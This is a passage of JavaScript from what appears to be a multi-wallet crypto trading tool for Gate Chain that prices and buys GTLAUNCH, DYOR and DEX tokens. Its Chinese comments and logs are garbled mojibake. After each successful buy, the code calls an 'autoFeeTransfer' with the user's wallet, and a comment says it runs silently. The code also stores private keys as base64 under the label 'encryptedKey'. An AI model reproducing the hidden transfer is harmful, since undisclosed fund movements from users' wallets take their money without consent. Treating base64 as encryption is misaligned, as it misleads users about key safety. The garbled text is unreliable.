                    console.log('‰ΩøÁî®Â§ñÁõò‰ª∑Ê†ºËÆ°ÁÆó');
                    // Â§ñÁõò‰∏çÈúÄË¶ÅÂå∫ÂàÜGTLAUNCHÂíåDYORÂçèËÆÆÔºåÂè™Âå∫ÂàÜGTSWAPÂíåDYORSWAP
                    return await calculateExternalPrice(tokenAddress, provider);
                }
            } catch (error) {
                console.error('ËÆ°ÁÆó‰ª£Â∏Å‰ª∑Ê†ºÂ§±Ë¥•:', error);
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: error.message
                };
            }
        }

        // ÂÜÖÁõòGTLAUNCH‰ª∑Ê†ºËÆ°ÁÆó
        async function calculateInternalPrice(tokenAddress, provider) {
            console.log('‰ΩøÁî®ÂÜÖÁõòGTLAUNCH‰ª∑Ê†ºËÆ°ÁÆó...');
            
            // Ëé∑ÂèñÂêàÁ∫¶ÁöÑGT‰ΩôÈ¢ù
            console.log('Ëé∑ÂèñÂêàÁ∫¶GT‰ΩôÈ¢ù...');
            const contractGTBalance = await provider.getBalance(tokenAddress);
            const contractGTBalanceFormatted = parseFloat(ethers.formatEther(contractGTBalance));
            console.log(`ÂêàÁ∫¶GT‰ΩôÈ¢ù: ${contractGTBalanceFormatted} GT`);
            
            // Ëé∑ÂèñÂêàÁ∫¶ÁöÑ‰ª£Â∏ÅÊÄª‰æõÂ∫îÈáè
            console.log('Ëé∑Âèñ‰ª£Â∏ÅÊÄª‰æõÂ∫îÈáè...');
            const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, provider);
            const totalSupply = await tokenContract.totalSupply();
            const decimals = await tokenContract.decimals();
            const totalSupplyFormatted = parseFloat(ethers.formatUnits(totalSupply, decimals));
            console.log(`‰ª£Â∏ÅÊÄª‰æõÂ∫îÈáè: ${totalSupplyFormatted} (Á≤æÂ∫¶: ${decimals})`);
            
            // Ê£ÄÊü•Êï∞ÊçÆÊúâÊïàÊÄß
            if (contractGTBalanceFormatted === 0) {
                console.warn('ÂêàÁ∫¶GT‰ΩôÈ¢ù‰∏∫0ÔºåÊó†Ê≥ïËÆ°ÁÆó‰ª∑Ê†º');
                return {
                    contractGTBalance: 0,
                    totalSupply: totalSupplyFormatted,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: 'ÂêàÁ∫¶GT‰ΩôÈ¢ù‰∏∫0'
                };
            }
            
            if (totalSupplyFormatted === 0) {
                console.warn('‰ª£Â∏ÅÊÄª‰æõÂ∫îÈáè‰∏∫0ÔºåÊó†Ê≥ïËÆ°ÁÆó‰ª∑Ê†º');
                return {
                    contractGTBalance: contractGTBalanceFormatted,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: '‰ª£Â∏ÅÊÄª‰æõÂ∫îÈáè‰∏∫0'
                };
            }
            
            // GTLAUNCH‰ª∑Ê†ºËÆ°ÁÆóÔºöÂêàÁ∫¶GTÊï∞Èáè / ÂêàÁ∫¶‰ª£Â∏ÅÊï∞Èáè
            const pricePerToken = contractGTBalanceFormatted / totalSupplyFormatted;
            const pricePerGT = totalSupplyFormatted / contractGTBalanceFormatted; // 1 GTËÉΩ‰π∞Â§öÂ∞ë‰ª£Â∏Å
            
            console.log(`ÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆóÂÆåÊàê:`);
            console.log(`- 1‰ª£Â∏Å‰ª∑Ê†º: ${pricePerToken} GT`);
            console.log(`- 1GTÂèØ‰π∞: ${pricePerGT} ‰ª£Â∏Å`);
            
            return {
                contractGTBalance: contractGTBalanceFormatted,
                totalSupply: totalSupplyFormatted,
                pricePerToken: pricePerToken,
                pricePerGT: pricePerGT
            };
        }

        // DYORÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆó
        async function calculateDYORInternalPrice(tokenAddress, provider) {
            console.log('‰ΩøÁî®DYORÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆó...');
            
            try {
                const routerAddress = DEX_ADDRESSES.DYOR_INTERNAL.router;
                
                // ÂàõÂª∫RouterÂêàÁ∫¶ÂÆû‰æã
                const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, provider);
                
                // ‰ΩøÁî®Ê≠£Á°ÆÁöÑDYORÂÜÖÁõòË∑ØÂæÑÂú∞ÂùÄ
                const correctPath0 = '0x672f30407a71fa8737a3a14474ff37e09c7fc44a'; // Ê≠£Á°ÆÁöÑpath[0]Âú∞ÂùÄ
                console.log(`DYORÂÜÖÁõòË∑ØÂæÑÂú∞ÂùÄ: ${correctPath0}`);
                
                // ËÆ°ÁÆó1 GTËÉΩ‰π∞Â§öÂ∞ë‰ª£Â∏Å
                const amountIn = ethers.parseEther("1"); // 1 GT
                // DYORÂÜÖÁõò‰∏çÊîØÊåÅÊ†áÂáÜÁöÑgetAmountsOutÔºå‰ΩøÁî®Âõ∫ÂÆö‰ª∑Ê†º‰º∞ÁÆó
                console.log('DYORÂÜÖÁõòË∑≥Ëøá‰ª∑Ê†ºÊü•ËØ¢Ôºå‰ΩøÁî®Âõ∫ÂÆö‰ª∑Ê†º‰º∞ÁÆó');
                
                // ‰ΩøÁî®Êõ¥‰øùÂÆàÁöÑÂõ∫ÂÆö‰ª∑Ê†ºÔºö1‰∏™‰ª£Â∏Å = 0.0000001 GTÔºàÈôç‰Ωé10ÂÄçÔºâ
                const fixedPricePerToken = 0.0000001; // 1‰∏™‰ª£Â∏ÅÈúÄË¶ÅÂ§öÂ∞ëGTÔºàÊõ¥‰øùÂÆàÔºâ
                const pricePerGT = 1 / fixedPricePerToken; // 1 GTËÉΩ‰π∞Â§öÂ∞ë‰ª£Â∏Å
                
                console.log(`DYORÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆóÂÆåÊàêÔºàÂõ∫ÂÆö‰ª∑Ê†ºÔºâ:`);
                console.log(`- 1‰ª£Â∏Å‰ª∑Ê†º: ${fixedPricePerToken} GT`);
                console.log(`- 1GTÂèØ‰π∞: ${pricePerGT} ‰ª£Â∏Å`);
                
                return {
                    contractGTBalance: 1, // DYORÂÜÖÁõò‰∏çÈÄÇÁî®
                    totalSupply: 0, // DYORÂÜÖÁõò‰∏çÈÄÇÁî®
                    pricePerToken: fixedPricePerToken,
                    pricePerGT: pricePerGT
                };
                
            } catch (error) {
                console.error('DYORÂÜÖÁõò‰ª∑Ê†ºËÆ°ÁÆóÂ§±Ë¥•:', error);
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: error.message
                };
            }
        }

        // Â§ñÁõòGTSWAP/DYOR V2‰ª∑Ê†ºËÆ°ÁÆó
        async function calculateExternalPrice(tokenAddress, provider) {
            console.log(`‰ΩøÁî®Â§ñÁõò${selectedDex}‰ª∑Ê†ºËÆ°ÁÆó...`);
            
            if (!selectedDex || !DEX_ADDRESSES[selectedDex]) {
                console.warn('Êú™ÈÄâÊã©DEXÊàñDEXÂú∞ÂùÄÊú™ÈÖçÁΩÆ');
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: 'DEXÊú™ÈÖçÁΩÆ'
                };
            }
            
            try {
                const dexConfig = DEX_ADDRESSES[selectedDex];
                const routerAddress = dexConfig.router;
                
                if (routerAddress === '0x...') {
                    console.warn(`${selectedDex} RouterÂú∞ÂùÄÊú™ÈÖçÁΩÆ`);
                    return {
                        contractGTBalance: 0,
                        totalSupply: 0,
                        pricePerToken: 0,
                        pricePerGT: 0,
                        error: `${selectedDex} RouterÂú∞ÂùÄÊú™ÈÖçÁΩÆ`
                    };
                }
                
                // ÂàõÂª∫RouterÂêàÁ∫¶ÂÆû‰æã
                const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, provider);
                
                // Ëé∑ÂèñWETHÂú∞ÂùÄÔºàÂú®Gate Chain‰∏äÂ∫îËØ•ÊòØWGTÔºâ
                const wgtAddress = await routerContract.WETH();
                console.log(`WGTÂú∞ÂùÄ: ${wgtAddress}`);
                
                // ËÆ°ÁÆó1 GTËÉΩ‰π∞Â§öÂ∞ë‰ª£Â∏Å
                const amountIn = ethers.parseEther("1"); // 1 GT
                const path = [wgtAddress, tokenAddress];
                
                console.log('Êü•ËØ¢1 GTËÉΩ‰π∞Â§öÂ∞ë‰ª£Â∏Å...');
                let amounts;
                try {
                    amounts = await routerContract.getAmountsOut(amountIn, path);
                } catch (error) {
                    console.warn(`${selectedDex} getAmountsOutË∞ÉÁî®Â§±Ë¥•Ôºå‰ΩøÁî®Âõ∫ÂÆö‰ª∑Ê†º‰º∞ÁÆó:`, error.message);
                    // ‰ΩøÁî®Âõ∫ÂÆö‰ª∑Ê†º‰º∞ÁÆó
                    const fixedPricePerToken = 0.000001; // 1‰∏™‰ª£Â∏ÅÈúÄË¶ÅÂ§öÂ∞ëGT
                    const pricePerGT = 1 / fixedPricePerToken; // 1 GTËÉΩ‰π∞Â§öÂ∞ë‰ª£Â∏Å
                    
                    console.log(`Â§ñÁõò‰ª∑Ê†ºËÆ°ÁÆóÂÆåÊàêÔºàÂõ∫ÂÆö‰ª∑Ê†ºÔºâ:`);
                    console.log(`- 1‰ª£Â∏Å‰ª∑Ê†º: ${fixedPricePerToken} GT`);
                    console.log(`- 1GTÂèØ‰π∞: ${pricePerGT} ‰ª£Â∏Å`);
                    
                    return {
                        contractGTBalance: 1, // Â§ñÁõò‰∏çÈÄÇÁî®
                        totalSupply: 0, // Â§ñÁõò‰∏çÈÄÇÁî®
                        pricePerToken: fixedPricePerToken,
                        pricePerGT: pricePerGT
                    };
                }
                const tokenAmount = amounts[1];
                
                // Ëé∑Âèñ‰ª£Â∏ÅÁ≤æÂ∫¶
                const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, provider);
                const decimals = await tokenContract.decimals();
                const tokenAmountFormatted = parseFloat(ethers.formatUnits(tokenAmount, decimals));
                
                // ËÆ°ÁÆó‰ª∑Ê†º
                const pricePerGT = tokenAmountFormatted; // 1 GTËÉΩ‰π∞Â§öÂ∞ë‰ª£Â∏Å
                const pricePerToken = 1 / tokenAmountFormatted; // 1‰∏™‰ª£Â∏ÅÈúÄË¶ÅÂ§öÂ∞ëGT
                
                console.log(`Â§ñÁõò‰ª∑Ê†ºËÆ°ÁÆóÂÆåÊàê:`);
                console.log(`- 1‰ª£Â∏Å‰ª∑Ê†º: ${pricePerToken} GT`);
                console.log(`- 1GTÂèØ‰π∞: ${pricePerGT} ‰ª£Â∏Å`);
                
                return {
                    contractGTBalance: 1, // Â§ñÁõò‰∏çÈÄÇÁî®
                    totalSupply: 0, // Â§ñÁõò‰∏çÈÄÇÁî®
                    pricePerToken: pricePerToken,
                    pricePerGT: pricePerGT
                };
                
            } catch (error) {
                console.error('Â§ñÁõò‰ª∑Ê†ºËÆ°ÁÆóÂ§±Ë¥•:', error);
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: error.message
                };
            }
        }

        // Êõ¥Êñ∞‰ª£Â∏Å‰ø°ÊÅØÊòæÁ§∫
        async function updateTokenInfoDisplay() {
            if (!currentTokenInfo) return;
            
            const tokenAddress = currentTokenInfo.address;
            const activeWallets = wallets.filter(w => w.active);
            
            if (activeWallets.length === 0) return;
            
            const wallet = activeWallets[0];
            
            try {
                // Ëé∑Âèñ‰ª£Â∏Å‰ΩôÈ¢ù
                const balanceInfo = await getTokenBalance(tokenAddress, wallet.address);
                
                // Ëé∑Âèñ‰ª∑Ê†º‰ø°ÊÅØÔºàÁî®‰∫éËÆ°ÁÆó‰π∞ÂÖ•ÂçñÂá∫Ôºâ
                // Ê∑ªÂä†Ë∞ÉËØï‰ø°ÊÅØ
                console.log('updateTokenInfoDisplay - ÂΩìÂâçÂπ≥Âè∞:', selectedPlatform);
                console.log('updateTokenInfoDisplay - ÂΩìÂâçDEX:', selectedDex);
                console.log('updateTokenInfoDisplay - ‰ª£Â∏ÅÂçèËÆÆ:', currentTokenInfo.protocol);
                
                // GTLAUNCHÂÜÖÁõò‰∏çÈúÄË¶Å‰ª∑Ê†ºËÆ°ÁÆóÔºåÂè™ÊòæÁ§∫ÂêàÁ∫¶‰ΩôÈ¢ù
                if (currentTokenInfo.protocol === 'GTLAUNCH' && selectedPlatform === 'internal') {
                    console.log('GTLAUNCHÂÜÖÁõòË∑≥Ëøá‰ª∑Ê†ºËÆ°ÁÆóÔºåÂè™ÊòæÁ§∫ÂêàÁ∫¶‰ΩôÈ¢ù');
                    const fixedPriceInfo = {
                        contractGTBalance: 1,
                        totalSupply: 0,
                        pricePerToken: 0, // ‰∏çÊòæÁ§∫‰ª∑Ê†º
                        pricePerGT: 0     // ‰∏çÊòæÁ§∫‰ª∑Ê†º
                    };
                    window.currentPriceInfo = fixedPriceInfo;
                    // ‰∏çreturnÔºåÁªßÁª≠ÊâßË°åÂêéÈù¢ÁöÑÂêàÁ∫¶‰ΩôÈ¢ùÊòæÁ§∫ÈÄªËæë
                } else {
                    console.log('ÂáÜÂ§áË∞ÉÁî®calculateTokenPrice');
                    console.log('ÂΩìÂâçÁä∂ÊÄÅ - selectedPlatform:', selectedPlatform, 'selectedDex:', selectedDex, 'protocol:', currentTokenInfo.protocol);
                    
                    const priceInfo = await calculateTokenPrice(tokenAddress);
                    
                    // ÁºìÂ≠ò‰ª∑Ê†º‰ø°ÊÅØ‰æõ‰π∞ÂÖ•ÂçñÂá∫ËÆ°ÁÆó‰ΩøÁî®
                    window.currentPriceInfo = priceInfo;
                }
                
            } catch (error) {
                console.error('Failed to update token info display:', error);
            }
        }


        // Êõ¥Êñ∞‰ª£Â∏ÅÊòæÁ§∫‰ø°ÊÅØ
        function updateTokenDisplayInfo(balanceInfo, priceInfo) {
            const tokenDisplay = document.getElementById('tokenDisplay');
            const tokenLogo = document.getElementById('tokenLogo');
            const tokenName = document.getElementById('tokenName');
            const tokenSymbol = document.getElementById('tokenSymbol');
            
            if (currentTokenInfo) {
                tokenLogo.textContent = currentTokenInfo.symbol.substring(0, 2);
                tokenName.textContent = currentTokenInfo.name;
                tokenSymbol.textContent = currentTokenInfo.symbol;
                tokenDisplay.classList.add('active');
                
                // ÁÆÄÂåñÁöÑ‰ª∑Ê†º‰ø°ÊÅØÊòæÁ§∫
                const priceInfoHtml = `
                    <div style="margin-top: 12px; padding: 12px; background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(96, 165, 250, 0.05)); border-radius: 8px; border: 1px solid rgba(59, 130, 246, 0.2);">
                        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; font-size: 12px;">
                            <div>
                                <div style="color: rgba(30, 41, 59, 0.7); margin-bottom: 4px;">ÊåÅÊúâÊï∞Èáè</div>
                                <div style="font-weight: bold; color: #3b82f6;">${parseFloat(balanceInfo.formattedBalance).toFixed(4)} ${currentTokenInfo.symbol}</div>
                            </div>
                            <div>
                                <div style="color: rgba(30, 41, 59, 0.7); margin-bottom: 4px;">‰ª£Â∏Å‰ª∑Ê†º</div>
                                <div style="font-weight: bold; color: #3b82f6;">${priceInfo.pricePerToken.toFixed(8)} GT</div>
                            </div>
                            <div>
                                <div style="color: rgba(30, 41, 59, 0.7); margin-bottom: 4px;">1 GTÂèØ‰π∞</div>
                                <div style="font-weight: bold; color: #10b981;">${priceInfo.pricePerGT.toFixed(2)} ${currentTokenInfo.symbol}</div>
                            </div>
                        </div>
                    </div>
                `;
                
                // ÁßªÈô§ÊóßÁöÑ‰ª∑Ê†º‰ø°ÊÅØ
                const existingPriceInfo = tokenDisplay.querySelector('.price-info');
                if (existingPriceInfo) {
                    existingPriceInfo.remove();
                }
                
                // Ê∑ªÂä†Êñ∞ÁöÑ‰ª∑Ê†º‰ø°ÊÅØ
                const priceInfoDiv = document.createElement('div');
                priceInfoDiv.className = 'price-info';
                priceInfoDiv.innerHTML = priceInfoHtml;
                tokenDisplay.appendChild(priceInfoDiv);
            }
        }


        // Âπ≥Âè∞ÂàáÊç¢
        function switchPlatform(platform) {
            selectedPlatform = platform;
            
            const tabs = document.querySelectorAll('.platform-tab');
            for (let i = 0; i < tabs.length; i++) {
                tabs[i].classList.remove('active');
            }
            event.target.classList.add('active');
            
            if (platform === 'external') {
                document.getElementById('externalDexOptions').style.display = 'grid';
                document.getElementById('internalDexOptions').style.display = 'none';
                document.getElementById('hexDataGroup').style.display = 'none';
                // Â§ñÁõòÈöêËóèÂêàÁ∫¶‰ΩôÈ¢ùÊòæÁ§∫
                document.getElementById('contractBalanceDisplay').style.display = 'none';
            } else {
                document.getElementById('externalDexOptions').style.display = 'none';
                document.getElementById('internalDexOptions').style.display = 'grid';
                document.getElementById('hexDataGroup').style.display = 'block';
                // ÂÜÖÁõòÊòæÁ§∫ÂêàÁ∫¶‰ΩôÈ¢ùÔºàÂ¶ÇÊûúÊúâ‰ª£Â∏Å‰ø°ÊÅØÔºâ
                if (currentTokenInfo && currentTokenInfo.protocol) {
                    getContractBalance(currentTokenInfo.address, currentTokenInfo.protocol)
                        .then(balanceInfo => displayContractBalance(balanceInfo))
                        .catch(error => console.error('Ëé∑ÂèñÂêàÁ∫¶‰ΩôÈ¢ùÂ§±Ë¥•:', error));
                }
            }
            
            selectedDex = null;
            const dexOptions = document.querySelectorAll('.dex-option');
            for (let i = 0; i < dexOptions.length; i++) {
                dexOptions[i].classList.remove('selected');
            }
        }


        // ÈÄâÊã©DEX
        function selectDex(dex, platform) {
            selectedDex = dex;
            
            const dexOptions = document.querySelectorAll('.dex-option');
            for (let i = 0; i < dexOptions.length; i++) {
                dexOptions[i].classList.remove('selected');
            }
            
            let target = event.target;
            while (target && !target.classList.contains('dex-option')) {
                target = target.parentElement;
            }
            if (target) {
                target.classList.add('selected');
            }
            
            // Êõ¥Êñ∞ÂÜÖÁõò‰∫§ÊòìËØ¥Êòé
            if (platform === 'internal') {
                updateInternalDexDescription(dex);
            }
            
            addLog('Â∑≤ÈÄâÊã© ' + dex, 'success');
        }

        // Êõ¥Êñ∞ÂÜÖÁõò‰∫§ÊòìËØ¥Êòé
        function updateInternalDexDescription(dex) {
            const titleElement = document.getElementById('internalDexTitle');
            const descriptionElement = document.getElementById('internalDexDescription');
            
            if (dex === 'GTLAUNCH') {
                titleElement.textContent = 'GTLAUNCH ÂÜÖÁõò‰∫§Êòì';
                descriptionElement.innerHTML = `
                    <div>‚Ä¢ <strong>‰π∞ÂÖ•</strong>: Âêë‰ª£Â∏ÅÂêàÁ∫¶ËΩ¨Ë¥¶GT + ‰π∞ÂÖ•Êï∞ÊçÆ</div>
                    <div>‚Ä¢ <strong>ÂçñÂá∫</strong>: Ë∞ÉÁî®‰ª£Â∏ÅÂêàÁ∫¶ÂçñÂá∫ÂáΩÊï∞</div>
                    <div>‚Ä¢ ÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆÂ∑≤Ëá™Âä®ÈÖçÁΩÆÔºåÊó†ÈúÄÊâãÂä®ËæìÂÖ•</div>
                `;
            } else if (dex === 'DYOR_INTERNAL') {
                titleElement.textContent = 'DYOR ÂÜÖÁõò‰∫§Êòì';
                descriptionElement.innerHTML = `
                    <div>‚Ä¢ <strong>‰π∞ÂÖ•</strong>: ÂêëDYOR RouterËΩ¨Ë¥¶GT + ‰π∞ÂÖ•Êï∞ÊçÆ</div>
                    <div>‚Ä¢ <strong>ÂçñÂá∫</strong>: Ë∞ÉÁî®DYOR RouterÂçñÂá∫ÂáΩÊï∞</div>
                    <div>‚Ä¢ ‰ΩøÁî®DYORÂÜÖÁõòRouterËøõË°å‰∫§Êòì</div>
                `;
            }
        }

        // ÊâßË°å‰π∞ÂÖ•
        async function executeBuy() {
            console.log('=== ÂºÄÂßãÊâßË°å‰π∞ÂÖ• ===');
            console.log('selectedDex:', selectedDex);
            console.log('selectedPlatform:', selectedPlatform);
            console.log('currentTokenInfo:', currentTokenInfo);
            
            if (!selectedDex) {
                showToast('ËØ∑ÈÄâÊã©‰∫§ÊòìÊâÄ', 'error');
                return;
            }
            
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('ËØ∑ÂÖàÂêØÁî®Èí±ÂåÖ', 'error');
                return;
            }
            
            const tokenAddress = document.getElementById('tokenAddress').value;
            const amount = document.getElementById('buyAmount').value;
            
            if (!tokenAddress || !amount) {
                showToast('ËØ∑Â°´ÂÜô‰∫§Êòì‰ø°ÊÅØ', 'error');
                return;
            }
            
            // ÂÜÖÁõò‰∫§ÊòìÂâçÈ™åËØÅÂçèËÆÆÂåπÈÖç
            if (selectedPlatform === 'internal') {
                const detectedProtocol = await detectTokenProtocol(tokenAddress);
                if (selectedDex !== detectedProtocol) {
                    const protocolName = detectedProtocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    const currentName = selectedDex === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    showToast(`‚ö†Ô∏è ÂçèËÆÆ‰∏çÂåπÈÖçÔºÅ‰ª£Â∏ÅÊòØ${protocolName}ÂçèËÆÆÔºå‰ΩÜÈÄâÊã©‰∫Ü${currentName}ÂçèËÆÆ„ÄÇËØ∑ÈáçÊñ∞ÈÄâÊã©Ê≠£Á°ÆÁöÑÂçèËÆÆ„ÄÇ`, 'error');
                    return;
                }
            }
            
            // ÂÜÖÁõò‰∫§ÊòìÈÄªËæë
            if (selectedPlatform === 'internal') {
                console.log('ÊâßË°åÂÜÖÁõò‰π∞ÂÖ•‰∫§Êòì');
                console.log('selectedDex:', selectedDex);
                console.log('‰ª£Â∏ÅÂú∞ÂùÄ:', tokenAddress);
                console.log('‰∫§ÊòìÈáëÈ¢ù:', amount);
                
                if (selectedDex === 'DYOR_INTERNAL') {
                    console.log('Ë∞ÉÁî®DYORÂÜÖÁõò‰π∞ÂÖ•');
                    await executeDYORInternalBuy(activeWallets, tokenAddress, amount);
                } else {
                    console.log('Ë∞ÉÁî®GTLAUNCHÂÜÖÁõò‰π∞ÂÖ•');
                await executeInternalBuy(activeWallets, tokenAddress, amount);
                }
                return;
            }
            
            isTrading = true;
            document.getElementById('buyBtn').disabled = true;
            document.getElementById('buyBtnText').innerHTML = '<span class="loading-spinner"></span> ‰π∞ÂÖ•‰∏≠';
            
            // Â§ñÁõòGTSWAP/DYOR V2‰∫§Êòì
            await executeExternalBuy(activeWallets, tokenAddress, amount);
        }

        // ÊâßË°åÂÜÖÁõò‰π∞ÂÖ• - ÈõÜÊàêbuy.jsËÑöÊú¨
        async function executeInternalBuy(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('buyBtn').disabled = true;
            document.getElementById('buyBtnText').innerHTML = '<span class="loading-spinner"></span> ÂÜÖÁõò‰π∞ÂÖ•‰∏≠';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // Ëé∑ÂèñÂä®ÊÄÅgasËÆæÁΩÆ
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        const amountInWei = ethers.parseEther(amount);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] üöÄ ÂºÄÂßã‰π∞ÂÖ•‰∫§Êòì...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÁõÆÊ†áÂú∞ÂùÄ: ' + tokenAddress, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÈáëÈ¢ù: ' + amount + ' GT', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] GasÊ®°Âºè: ' + GAS_CONFIG.SPEEDS[currentGasSpeed].name, 'info');
                        
                        // ÊûÑÂª∫‰∫§ÊòìÂØπË±° - Âü∫‰∫ébuy.jsËÑöÊú¨
                        const tx = {
                            to: tokenAddress,
                            value: amountInWei,
                            data: GTLAUNCH_DATA.BUY_HEX, // 0xd0febe4c
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        };
                        
                        console.log('GTLAUNCHÂÜÖÁõò‰π∞ÂÖ•‰∫§ÊòìÂØπË±°:', tx);
                        console.log('‰π∞ÂÖ•ÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆ:', GTLAUNCH_DATA.BUY_HEX);
                        
                        // ÂèëÈÄÅ‰∫§Êòì
                        const txResponse = await walletInstance.sendTransaction(tx);
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ∑≤ÂèëÈÄÅ: ' + txResponse.hash, 'success');
                        
                        // Á≠âÂæÖ‰∫§ÊòìÁ°ÆËÆ§
                        const receipt = await txResponse.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GTLAUNCHÂÜÖÁõò‰π∞ÂÖ•ÊàêÂäü!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] Âå∫Âùó: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // Ëá™Âä®Êî∂Ë¥πËΩ¨Ë¥¶ÔºàÈùôÈªòÊâßË°åÔºâ
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // ÊòæÁ§∫ÊàêÂäüÊèêÁ§∫
                            showToast('üéâ ‰π∞ÂÖ•ÊàêÂäüÔºÅ', 'success');
                            
                            // Êõ¥Êñ∞‰ΩôÈ¢ùÂíå‰ª£Â∏Å‰ø°ÊÅØ
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥• - Áä∂ÊÄÅ: ' + receipt.status, 'error');
                            showToast('‚ùå ‰π∞ÂÖ•Â§±Ë¥•ÔºÅ', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥•: ' + error.message, 'error');
                        
                        // Ê£ÄÊü•ÂçèËÆÆÂåπÈÖç
                        checkProtocolMatch(error);
                        
                        // Êèê‰æõÊõ¥ËØ¶ÁªÜÁöÑÈîôËØØ‰ø°ÊÅØ
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÂêàÁ∫¶Ë∞ÉÁî®ÂºÇÂ∏∏ÔºåËØ∑Ê£ÄÊü•‰ª£Â∏ÅÂú∞ÂùÄÂíåÂèÇÊï∞', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰ΩôÈ¢ù‰∏çË∂≥', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GasÈôêÂà∂‰∏çÂèØÈ¢ÑÊµãÔºå‰∫§ÊòìÂèØËÉΩÂ§±Ë¥•', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('GTLAUNCHÂÜÖÁõò‰π∞ÂÖ•ÂÆåÊàê', 'success');
                
            } catch (error) {
                console.error('Internal buy failed:', error);
                showToast('ÂÜÖÁõò‰π∞ÂÖ•Â§±Ë¥•: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('buyBtn').disabled = false;
                document.getElementById('buyBtnText').textContent = '‰π∞ÂÖ•';
            }
        }

        // ÊâßË°åÂçñÂá∫
        async function executeSell() {
            if (!selectedDex) {
                showToast('ËØ∑ÈÄâÊã©‰∫§ÊòìÊâÄ', 'error');
                return;
            }
            
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('ËØ∑ÂÖàÂêØÁî®Èí±ÂåÖ', 'error');
                return;
            }
            
            const tokenAddress = document.getElementById('tokenAddress').value;
            const amount = document.getElementById('sellAmount').value;
            
            if (!tokenAddress || !amount) {
                showToast('ËØ∑Â°´ÂÜô‰∫§Êòì‰ø°ÊÅØ', 'error');
                return;
            }
            
            // ÂÜÖÁõò‰∫§ÊòìÂâçÈ™åËØÅÂçèËÆÆÂåπÈÖç
            if (selectedPlatform === 'internal') {
                const detectedProtocol = await detectTokenProtocol(tokenAddress);
                if (selectedDex !== detectedProtocol) {
                    const protocolName = detectedProtocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    const currentName = selectedDex === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    showToast(`‚ö†Ô∏è ÂçèËÆÆ‰∏çÂåπÈÖçÔºÅ‰ª£Â∏ÅÊòØ${protocolName}ÂçèËÆÆÔºå‰ΩÜÈÄâÊã©‰∫Ü${currentName}ÂçèËÆÆ„ÄÇËØ∑ÈáçÊñ∞ÈÄâÊã©Ê≠£Á°ÆÁöÑÂçèËÆÆ„ÄÇ`, 'error');
                    return;
                }
            }
            
            // ÂÜÖÁõò‰∫§ÊòìÈÄªËæë
            if (selectedPlatform === 'internal') {
                if (selectedDex === 'DYOR_INTERNAL') {
                    await executeDYORInternalSell(activeWallets, tokenAddress, amount);
                } else {
                await executeInternalSell(activeWallets, tokenAddress, amount);
                }
                return;
            }
            
            isTrading = true;
            document.getElementById('sellBtn').disabled = true;
            document.getElementById('sellBtnText').innerHTML = '<span class="loading-spinner"></span> ÂçñÂá∫‰∏≠';
            
